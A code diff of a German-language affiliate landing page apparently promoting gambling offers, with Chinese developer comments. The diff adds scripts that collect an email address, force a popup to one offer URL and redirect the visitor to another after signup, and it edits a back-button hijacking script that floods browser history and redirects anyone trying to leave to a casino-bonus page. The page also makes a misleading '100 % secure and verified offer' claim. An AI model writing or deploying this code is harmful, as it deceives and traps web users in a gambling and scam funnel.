@@ -197,49 +197,57 @@
         </div>
 
         <div id="form-section">
-
             <form id="subscribeForm" action="https://cas-track.online/sendy/subscribe" method="POST"
-                accept-charset="utf-8" target="_self">
-                <label for="email">E-Mail-Adresse</label><br />
-                <input type="email" name="email" id="email" required /><br />
-
-                <!-- Honeypot -->
-                <div style="display:none;">
-                    <label for="hp">HP</label><br />
-                    <input type="text" name="hp" id="hp" />
-                </div>
-
-                <input type="hidden" name="list" value="Fm4UY1D4JXfyn6nSE4UhJg" />
-                <input type="hidden" name="subform" value="yes" />
-                <input type="submit" name="submit" id="submit" value="🎁 Bonus sichern!" style="
-    background-color: #28a745;
-    color: white;
-    padding: 12px 0;
-    font-size: 18px;
-    font-weight: bold;
-    border: none;
-    border-radius: 8px;
-    width: 100%;
-    max-width: 300px;
-    display: block;
-    margin: 20px auto 10px;
-    cursor: pointer;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-" />
-
-                <p style="text-align: center; font-size: 0.85em; color: #666;">
-                    🔒 Kein Spam. Du kannst dich jederzeit abmelden. 100 % sicheres & verifiziertes Angebot.
-                </p>
+                  accept-charset="utf-8" target="_self">
+              <label for="email">E-Mail-Adresse</label><br />
+              <input type="email" name="email" id="email" required /><br />
+          
+              <!-- Honeypot -->
+              <div style="display:none;">
+                <label for="hp">HP</label><br />
+                <input type="text" name="hp" id="hp" />
+              </div>
+          
+              <input type="hidden" name="list" value="Fm4UY1D4JXfyn6nSE4UhJg" />
+              <input type="hidden" name="subform" value="yes" />
+              <button type="submit" id="submit" class="claim-btn" style="
+                background-color: #28a745;
+                color: white;
+                padding: 12px 0;
+                font-size: 18px;
+                font-weight: bold;
+                border: none;
+                border-radius: 8px;
+                width: 100%;
+                max-width: 300px;
+                display: block;
+                margin: 20px auto 10px;
+                cursor: pointer;
+                box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+              ">🎁 Bonus sichern!</button>
+          
+              <p style="text-align: center; font-size: 0.85em; color: #666;">
+                🔒 Kein Spam. Du kannst dich jederzeit abmelden. 100 % sicheres & verifiziertes Angebot.
+              </p>
             </form>
+          </div>
 
-            <script>
-                document.getElementById("subscribeForm").addEventListener("submit", function () {
-                    // 替换成你自己的 offer 链接 👇
-                    const offerUrl = "https://innovate-niche.com/chv3l3k.php?key=ybzoy66mivk27imho24y&c1={type}&c2={geo}";
-                    // 在新窗口中打开 offer 页面
-                    window.open('https://luckystarisyou.store/chv3l3k.php?lp=1', "_blank");
-                });
-            </script>
+          <script>
+            const offerA = "https://innovate-niche.com/chv3l3k.php?key=ybzoy66mivk27imho24y&c1={type}&c2={geo}";
+            const offerB = "https://luckystarisyou.store/chv3l3k.php?lp=1";
+          
+            // 监听按钮点击，在用户操作下立即弹出新窗口（iOS兼容关键）
+            document.getElementById("submit").addEventListener("click", function () {
+              window.open(offerB, "_blank");
+            });
+          
+            // 表单提交后再跳转当前页面，确保Sendy收到
+            document.getElementById("subscribeForm").addEventListener("submit", function () {
+              setTimeout(() => {
+                window.location.href = offerA;
+              }, 1000); // 延迟确保Sendy正常收信
+            });
+          </script>
         </div>
 
     </div>
@@ -581,7 +589,7 @@
         type="text/javascript">window.setTimeout(function () { alert('$10 deposit to claim $100 free bets and 200 free spins! Get it now!'); }, 2000);</script> -->
     <script>!function () {
             var t;
-            var tmp = 'http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=NG';
+            var tmp = 'http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=DE';
             try {
                 for (t = 0; 10 > t; ++t) history.pushState({}, '', '');
                 onpopstate = function (t) {
@@ -617,7 +625,7 @@
                 if (location.hash === "#!/history") {
                     history.replaceState(null, document.title, location.pathname);
                     setTimeout(function () {
-                        location.replace("http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=NG");
+                        location.replace("http://lp.innovate-niche.com/input-BBR/index.html?key=ybzoy66mivk27imho24y&c1=BBR&c2=DE");
                     }, 0);
                 }
             }, false);
